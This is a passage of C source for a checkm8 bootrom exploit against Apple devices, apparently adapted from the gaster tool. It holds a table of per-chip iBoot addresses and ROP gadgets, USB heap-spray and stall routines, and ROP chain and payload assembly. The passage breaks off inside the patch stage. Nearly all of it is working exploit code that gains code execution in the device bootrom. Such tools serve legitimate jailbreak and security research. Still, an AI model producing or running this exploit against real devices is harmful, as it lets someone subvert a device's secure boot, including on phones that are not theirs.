/* Copyright 2023 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * checkm8 exploit implementation for iDFU. Adapted directly from
 * gaster (0x7ff): chip parameter table, four exploit stages
 * (reset/setup/spray/patch), ROP/payload assembly and the
 * RESET/SETUP/SPRAY/PATCH/PWNED state machine driven via the
 * USB backend in usb.c.
 */
#include "checkm8.h"
#include "lzfse.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

extern unsigned usb_timeout, usb_abort_timeout_min;

/* Payload bytes (linked from xxd-generated headers, see usb.h include order). */
extern uint8_t payload_A9_bin[], payload_notA9_bin[], payload_notA9_armv7_bin[], payload_handle_checkm8_request_bin[], payload_handle_checkm8_request_armv7_bin[];
extern unsigned payload_A9_bin_len, payload_notA9_bin_len, payload_notA9_armv7_bin_len, payload_handle_checkm8_request_bin_len, payload_handle_checkm8_request_armv7_bin_len;

#include "payload_A9.h"
#include "payload_notA9.h"
#include "payload_notA9_armv7.h"
#include "payload_handle_checkm8_request.h"
#include "payload_handle_checkm8_request_armv7.h"

uint16_t cpid;
static uint32_t payload_dest_armv7;
static const char *pwnd_str = " PWND:[checkm8]";

static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad;
static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, dfu_handle_bus_reset, insecure_memory_base, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;

bool
checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
	char *usb_serial_num = get_usb_serial_number(handle);
	bool ret = false;

	if(usb_serial_num != NULL) {
		if(strstr(usb_serial_num, " SRTG:[iBoot-1145.3]") != NULL) {
			cpid = 0x8950;
			config_large_leak = 659;
			config_overwrite_pad = 0x640;
			memcpy_addr = 0x9ACC;
			aes_crypto_cmd = 0x7301;
			gUSBSerialNumber = 0x10061F80;
			dfu_handle_request = 0x10061A24;
			payload_dest_armv7 = 0x10079800;
			usb_core_do_transfer = 0x7621;
			dfu_handle_bus_reset = 0x10061A3C;
			insecure_memory_base = 0x10000000;
			handle_interface_request = 0x8161;
			usb_create_string_descriptor = 0x7C55;
			usb_serial_number_string_descriptor = 0x100600D8;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1145.3.3]") != NULL) {
			cpid = 0x8955;
			config_large_leak = 659;
			config_overwrite_pad = 0x640;
			memcpy_addr = 0x9B0C;
			aes_crypto_cmd = 0x7341;
			gUSBSerialNumber = 0x10061F80;
			dfu_handle_request = 0x10061A24;
			payload_dest_armv7 = 0x10079800;
			usb_core_do_transfer = 0x7661;
			dfu_handle_bus_reset = 0x10061A3C;
			insecure_memory_base = 0x10000000;
			handle_interface_request = 0x81A1;
			usb_create_string_descriptor = 0x7C95;
			usb_serial_number_string_descriptor = 0x100600D8;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1458.2]") != NULL) {
			cpid = 0x8947;
			config_large_leak = 626;
			config_overwrite_pad = 0x660;
			memcpy_addr = 0x9A3C;
			aes_crypto_cmd = 0x7061;
			gUSBSerialNumber = 0x3402DDF8;
			dfu_handle_request = 0x3402D92C;
			payload_dest_armv7 = 0x34039800;
			usb_core_do_transfer = 0x79ED;
			dfu_handle_bus_reset = 0x3402D944;
			insecure_memory_base = 0x34000000;
			handle_interface_request = 0x7BC9;
			usb_create_string_descriptor = 0x72A9;
			usb_serial_number_string_descriptor = 0x3402C2DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1704.10]") != NULL) {
			cpid = 0x8960;
			config_large_leak = 7936;
			config_overwrite_pad = 0x5C0;
			patch_addr = 0x100005CE0;
			memcpy_addr = 0x10000ED50;
			aes_crypto_cmd = 0x10000B9A8;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180086CDC;
			dfu_handle_request = 0x180086C70;
			usb_core_do_transfer = 0x10000CC78;
			dfu_handle_bus_reset = 0x180086CA0;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000CFB4;
			usb_create_string_descriptor = 0x10000BFEC;
			usb_serial_number_string_descriptor = 0x180080562;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL) {
			cpid = 0x7001;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000AD04;
			memcpy_addr = 0x100013F10;
			aes_crypto_cmd = 0x100010A90;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180088E48;
			dfu_handle_request = 0x180088DF8;
			usb_core_do_transfer = 0x100011BB4;
			dfu_handle_bus_reset = 0x180088E18;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x100011EE4;
			usb_create_string_descriptor = 0x100011074;
			usb_serial_number_string_descriptor = 0x180080C2A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
			cpid = 0x7000;
			config_overwrite_pad = 0x500;
			patch_addr = 0x100007E98;
			memcpy_addr = 0x100010E70;
			aes_crypto_cmd = 0x10000DA90;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x1800888C8;
			dfu_handle_request = 0x180088878;
			usb_core_do_transfer = 0x10000EBB4;
			dfu_handle_bus_reset = 0x180088898;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000EEE4;
			usb_create_string_descriptor = 0x10000E074;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2098.0.0.2.4]") != NULL) {
			cpid = 0x7002;
			config_overwrite_pad = 0x500;
			memcpy_addr = 0x89F4;
			aes_crypto_cmd = 0x6341;
			gUSBSerialNumber = 0x46005958;
			dfu_handle_request = 0x46005898;
			payload_dest_armv7 = 0x46007800;
			usb_core_do_transfer = 0x6E59;
			dfu_handle_bus_reset = 0x460058B0;
			insecure_memory_base = 0x46018000;
			handle_interface_request = 0x7081;
			usb_create_string_descriptor = 0x6745;
			usb_serial_number_string_descriptor = 0x4600034A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
			cpid = 0x8003;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			dfu_handle_bus_reset = 0x180087928;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
			cpid = 0x8000;
			config_overwrite_pad = 0x500;
			patch_addr = 0x10000812C;
			ttbr0_addr = 0x1800C8000;
			memcpy_addr = 0x100011030;
			aes_crypto_cmd = 0x10000DAA0;
			ttbr0_vrom_off = 0x400;
			boot_tramp_end = 0x1800E1000;
			gUSBSerialNumber = 0x180087958;
			dfu_handle_request = 0x1800878F8;
			usb_core_do_transfer = 0x10000EE78;
			dfu_handle_bus_reset = 0x180087928;
			insecure_memory_base = 0x180380000;
			handle_interface_request = 0x10000F1B0;
			usb_create_string_descriptor = 0x10000E354;
			usb_serial_number_string_descriptor = 0x1800807DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2481.0.0.2.1]") != NULL) {
			cpid = 0x8001;
			config_hole = 6;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000404;
			nop_gadget = 0x10000CD60;
			ret_gadget = 0x100000118;
			patch_addr = 0x100007668;
			ttbr0_addr = 0x180050000;
			func_gadget = 0x10000CD40;
			write_ttbr0 = 0x1000003B4;
			memcpy_addr = 0x1000106F0;
			aes_crypto_cmd = 0x10000C9D4;
			boot_tramp_end = 0x180044000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180047578;
			dfu_handle_request = 0x18004C378;
			usb_core_do_transfer = 0x10000DDA4;
			dfu_handle_bus_reset = 0x18004C3A8;
			insecure_memory_base = 0x180000000;
			handle_interface_request = 0x10000E0B4;
			usb_create_string_descriptor = 0x10000D280;
			usb_serial_number_string_descriptor = 0x18004486A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2651.0.0.1.31]") != NULL) {
			cpid = 0x8002;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			memcpy_addr = 0xB6F8;
			aes_crypto_cmd = 0x86DD;
			gUSBSerialNumber = 0x48802AB8;
			dfu_handle_request = 0x48806344;
			payload_dest_armv7 = 0x48806E00;
			usb_core_do_transfer = 0x9411;
			dfu_handle_bus_reset = 0x4880635C;
			insecure_memory_base = 0x48818000;
			handle_interface_request = 0x95F1;
			usb_create_string_descriptor = 0x8CA5;
			usb_serial_number_string_descriptor = 0x4880037A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2651.0.0.3.3]") != NULL) {
			cpid = 0x8004;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			memcpy_addr = 0xA884;
			aes_crypto_cmd = 0x786D;
			gUSBSerialNumber = 0x48802AE8;
			dfu_handle_request = 0x48806384;
			payload_dest_armv7 = 0x48806E00;
			usb_core_do_transfer = 0x85A1;
			dfu_handle_bus_reset = 0x4880639C;
			insecure_memory_base = 0x48818000;
			handle_interface_request = 0x877D;
			usb_create_string_descriptor = 0x7E35;
			usb_serial_number_string_descriptor = 0x488003CA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2696.0.0.1.33]") != NULL) {
			cpid = 0x8010;
			config_hole = 5;
			config_overwrite_pad = 0x5C0;
			tlbi = 0x100000434;
			nop_gadget = 0x10000CC6C;
			ret_gadget = 0x10000015C;
			patch_addr = 0x1000074AC;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CC4C;
			write_ttbr0 = 0x1000003E4;
			memcpy_addr = 0x100010730;
			aes_crypto_cmd = 0x10000C8F4;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083CF8;
			dfu_handle_request = 0x180088B48;
			usb_core_do_transfer = 0x10000DC98;
			dfu_handle_bus_reset = 0x180088B78;
			insecure_memory_base = 0x1800B0000;
			handle_interface_request = 0x10000DFB8;
			usb_create_string_descriptor = 0x10000D150;
			usb_serial_number_string_descriptor = 0x1800805DA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3135.0.0.2.3]") != NULL) {
			cpid = 0x8011;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000444;
			nop_gadget = 0x10000CD0C;
			ret_gadget = 0x100000148;
			patch_addr = 0x100007630;
			ttbr0_addr = 0x1800A0000;
			func_gadget = 0x10000CCEC;
			write_ttbr0 = 0x1000003F4;
			memcpy_addr = 0x100010950;
			aes_crypto_cmd = 0x10000C994;
			boot_tramp_end = 0x1800B0000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180083D28;
			dfu_handle_request = 0x180088A58;
			usb_core_do_transfer = 0x10000DD64;
			dfu_handle_bus_reset = 0x180088A88;
			insecure_memory_base = 0x1800B0000;
			handle_interface_request = 0x10000E08C;
			usb_create_string_descriptor = 0x10000D234;
			usb_serial_number_string_descriptor = 0x18008062A;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3332.0.0.1.23]") != NULL) {
			cpid = 0x8015;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x1000004AC;
			nop_gadget = 0x10000A9C4;
			ret_gadget = 0x100000148;
			patch_addr = 0x10000624C;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x10000A9AC;
			write_ttbr0 = 0x10000045C;
			memcpy_addr = 0x10000E9D0;
			aes_crypto_cmd = 0x100009E9C;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003A78;
			dfu_handle_request = 0x180008638;
			usb_core_do_transfer = 0x10000B9A8;
			dfu_handle_bus_reset = 0x180008668;
			insecure_memory_base = 0x18001C000;
			handle_interface_request = 0x10000BCCC;
			usb_create_string_descriptor = 0x10000AE80;
			usb_serial_number_string_descriptor = 0x1800008FA;
		} else if(strstr(usb_serial_num, " SRTG:[iBoot-3401.0.0.1.16]") != NULL) {
			cpid = 0x8012;
			config_hole = 6;
			config_overwrite_pad = 0x540;
			tlbi = 0x100000494;
			nop_gadget = 0x100008DB8;
			ret_gadget = 0x10000012C;
			patch_addr = 0x100004854;
			ttbr0_addr = 0x18000C000;
			func_gadget = 0x100008DA0;
			write_ttbr0 = 0x100000444;
			memcpy_addr = 0x10000EA30;
			aes_crypto_cmd = 0x1000082AC;
			boot_tramp_end = 0x18001C000;
			ttbr0_vrom_off = 0x400;
			ttbr0_sram_off = 0x600;
			gUSBSerialNumber = 0x180003AF8;
			dfu_handle_request = 0x180008B08;
			usb_core_do_transfer = 0x10000BD20;
			dfu_handle_bus_reset = 0x180008B38;
			insecure_memory_base = 0x18001C000;
			handle_interface_request = 0x10000BFFC;
			usb_create_string_descriptor = 0x10000B1CC;
			usb_serial_number_string_descriptor = 0x18000082A;
		}
		if(cpid != 0) {
			printf("CPID: 0x%" PRIX32 "\n", cpid);
			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL;
			ret = true;
		}
		free(usb_serial_num);
	}
	return ret;
}

bool
dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state) {
	struct {
		uint8_t status, poll_timeout[3], state, str_idx;
	} dfu_status;
	transfer_ret_t transfer_ret;

	return send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status), &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == sizeof(dfu_status) && dfu_status.status == status && dfu_status.state == state;
}

static bool
dfu_set_state_wait_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == 0 && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC) && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST) && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
}

static bool
checkm8_stage_reset(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	if(send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN && dfu_set_state_wait_reset(handle) && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == EP0_MAX_PACKET_SZ) {
		return true;
	}
	send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
	return false;
}

static bool
checkm8_stage_setup(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = usb_timeout - 1;
	transfer_ret_t transfer_ret;

	for(;;) {
		if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
			return true;
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
		usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
	}
	return false;
}

static bool
checkm8_usb_request_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static void
checkm8_stall(const usb_handle_t *handle) {
	unsigned usb_abort_timeout = usb_timeout - 1;
	transfer_ret_t transfer_ret;

	for(;;) {
		if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ && checkm8_usb_request_leak(handle)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;
	}
}

static bool
checkm8_no_leak(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret) && transfer_ret.sz == 0;
}

static bool
checkm8_usb_request_stall(const usb_handle_t *handle) {
	transfer_ret_t transfer_ret;

	return send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL;
}

static bool
checkm8_stage_spray(const usb_handle_t *handle) {
	size_t i;

	if(config_large_leak == 0) {
		if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000) {
			while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
		} else {
			checkm8_stall(handle);
			for(i = 0; i < config_hole; ++i) {
				while(!checkm8_no_leak(handle)) {}
			}
			while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
	} else {
		for(i = 0; i < config_large_leak; ++i) {
			while(!checkm8_usb_request_stall(handle)) {}
		}
		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
	}
	return true;
}

static size_t
usb_rop_callbacks(uint8_t *buf, uint64_t addr, const callback_t *callbacks, size_t callback_cnt) {
	uint8_t block_0[MAX_BLOCK_SZ], block_1[MAX_BLOCK_SZ];
	size_t i, j, sz = 0, block_0_sz, block_1_sz;
	uint64_t reg;

	for(i = 0; i < callback_cnt; i += 5) {
		block_1_sz = block_0_sz = 0;
		for(j = 0; j < 5; ++j) {
			addr += MAX_BLOCK_SZ / 5;
			if(j == 4) {
				addr += MAX_BLOCK_SZ;
			}
			if(i + j < callback_cnt - 1) {
				reg = func_gadget;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = addr;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
			} else if(i + j == callback_cnt - 1) {
				reg = func_gadget;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = callbacks[i + j].arg;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
				reg = callbacks[i + j].func;
				memcpy(block_1 + block_1_sz, &reg, sizeof(reg));
				block_1_sz += sizeof(reg);
			} else {
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
				reg = 0;
				memcpy(block_0 + block_0_sz, &reg, sizeof(reg));
				block_0_sz += sizeof(reg);
			}
		}
		memcpy(buf + sz, block_0, block_0_sz);
		sz += block_0_sz;
		memcpy(buf + sz, block_1, block_1_sz);
		sz += block_1_sz;
	}
	return sz;
}

bool
dfu_send_data(const usb_handle_t *handle, uint8_t *data, size_t len) {
	transfer_ret_t transfer_ret;
	size_t i, packet_sz;

	for(i = 0; i < len; i += packet_sz) {
		packet_sz = MIN(len - i, DFU_MAX_TRANSFER_SZ);
		if(!send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, &transfer_ret) || transfer_ret.ret != USB_TRANSFER_OK || transfer_ret.sz != packet_sz) {
			return false;
		}
	}
	return send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == DFU_FILE_SUFFIX_LEN && dfu_set_state_wait_reset(handle);
}

static bool
checkm8_stage_patch(const usb_handle_t *handle) {
	struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
	} A9;
	struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
	} notA9;
	struct {
		uint32_t pwnd[4], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor;
	} notA9_armv7;
	struct {
		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
	} handle_checkm8_request;
	struct {
		uint32_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
	} handle_checkm8_request_armv7;
	callback_t callbacks[] = {
		{ write_ttbr0, insecure_memory_base },
		{ tlbi, 0 },
		{ insecure_memory_base + ARM_16K_TT_L2_SZ + ttbr0_sram_off + 2 * sizeof(uint64_t), 0 },
		{ write_ttbr0, ttbr0_addr },
		{ tlbi, 0 },
		{ ret_gadget, 0 }
	};
	size_t i, data_sz, packet_sz, payload_sz, overwrite_sz, payload_handle_checkm8_request_sz;
	uint8_t *data, *payload, *payload_handle_checkm8_request;
	checkm8_overwrite_armv7_t checkm8_overwrite_armv7;
	checkm8_overwrite_t checkm8_overwrite;
	transfer_ret_t transfer_ret;
	bool ret = false;
	void *overwrite;
	uint64_t reg;

	if(cpid == 0x8003 || cpid == 0x8000) {
		if(payload_A9_bin_len > sizeof(A9)) {
			payload = payload_A9_bin;
			payload_sz = payload_A9_bin_len - sizeof(A9);
		} else {
			payload = NULL;
			payload_sz = 0;
		}
	} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
		if(payload_notA9_bin_len > sizeof(notA9)) {
			payload = payload_notA9_bin;
			payload_sz = payload_notA9_bin_len - sizeof(notA9);
		} else {
			payload = NULL;
			payload_sz = 0;
		}
	} else if(payload_notA9_armv7_bin_len > sizeof(notA9_armv7)) {
		payload = payload_notA9_armv7_bin;
		payload_sz = payload_notA9_armv7_bin_len - sizeof(notA9_armv7);
	} else {
		payload = NULL;
		payload_sz = 0;
	}
	if(payload != NULL) {
		if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
			if(payload_handle_checkm8_request_bin_len > sizeof(handle_checkm8_request)) {
				payload_handle_checkm8_request = payload_handle_checkm8_request_bin;
				payload_handle_checkm8_request_sz = payload_handle_checkm8_request_bin_len - sizeof(handle_checkm8_request);
				if(cpid == 0x8003 || cpid == 0x8000) {
					data = calloc(1, payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
					data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
				} else {
					data = calloc(1, payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
				}
			} else {
				payload_handle_checkm8_request = NULL;
				payload_handle_checkm8_request_sz = 0;
				data = NULL;
			}
		} else if(payload_handle_checkm8_request_armv7_bin_len > sizeof(handle_checkm8_request_armv7)) {
			payload_handle_checkm8_request = payload_handle_checkm8_request_armv7_bin;
			payload_handle_checkm8_request_sz = payload_handle_checkm8_request_armv7_bin_len - sizeof(handle_checkm8_request_armv7);
			data = calloc(1, payload_sz + sizeof(notA9_armv7) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request_armv7));
		} else {
			payload_handle_checkm8_request = NULL;
			payload_handle_checkm8_request_sz = 0;
			data = NULL;
		}
		if(data != NULL) {
			if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
				reg = 0x1000006A5;
				memcpy(data + ttbr0_vrom_off, &reg, sizeof(reg));
				reg = 0x60000100000625;
				memcpy(data + ttbr0_vrom_off + sizeof(reg), &reg, sizeof(reg));
				reg = 0x60000180000625;
				memcpy(data + ttbr0_sram_off, &reg, sizeof(reg));
				reg = 0x1800006A5;
				memcpy(data + ttbr0_sram_off + sizeof(reg), &reg, sizeof(reg));
				usb_rop_callbacks(data + offsetof(dfu_callback_t, callback), insecure_memory_base, callbacks, sizeof(callbacks) / sizeof(callbacks[0]));
				data_sz = ttbr0_sram_off + 2 * sizeof(reg);
			} else {
				data_sz = 0;
			}
			memcpy(data + data_sz, payload, payload_sz);
			data_sz += payload_sz;
			if(cpid == 0x8003 || cpid == 0x8000) {
				memset(A9.pwnd, '\0', sizeof(A9.pwnd));
				memcpy(A9.pwnd, pwnd_str, strlen(pwnd_str));
				A9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
				A9.dfu_handle_bus_reset = dfu_handle_bus_reset;
				A9.dfu_handle_request = dfu_handle_request;
				A9.payload_off = payload_sz + sizeof(A9);
				A9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
				A9.memcpy_addr = memcpy_addr;
				A9.gUSBSerialNumber = gUSBSerialNumber;
				A9.usb_create_string_descriptor = usb_create_string_descriptor;
				A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
				A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
				A9.patch_addr = patch_addr;
				memcpy(data + data_sz, &A9, sizeof(A9));
				data_sz += sizeof(A9);
				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
				data_sz += payload_handle_checkm8_request_sz;
				handle_checkm8_request.handle_interface_request = handle_interface_request;
				handle_checkm8_request.insecure_memory_base = insecure_memory_base;
				handle_checkm8_request.exec_magic = EXEC_MAGIC;
				handle_checkm8_request.done_magic = DONE_MAGIC;
				handle_checkm8_request.memc_magic = MEMC_MAGIC;
				handle_checkm8_request.memcpy_addr = memcpy_addr;
				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
				data_sz += sizeof(handle_checkm8_request);
			} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
				memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
				memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
				notA9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
				notA9.dfu_handle_bus_reset = dfu_handle_bus_reset;
				notA9.dfu_handle_request = dfu_handle_request;
				notA9.payload_off = payload_sz + sizeof(notA9);
				notA9.payload_sz = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request);
				notA9.memcpy_addr = memcpy_addr;
				notA9.gUSBSerialNumber = gUSBSerialNumber;
				notA9.usb_create_string_descriptor = usb_create_string_descriptor;
				notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
				notA9.patch_addr = patch_addr;
				if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
					notA9.patch_addr += ARM_16K_TT_L2_SZ;
				}
				memcpy(data + data_sz, &notA9, sizeof(notA9));
				data_sz += sizeof(notA9);
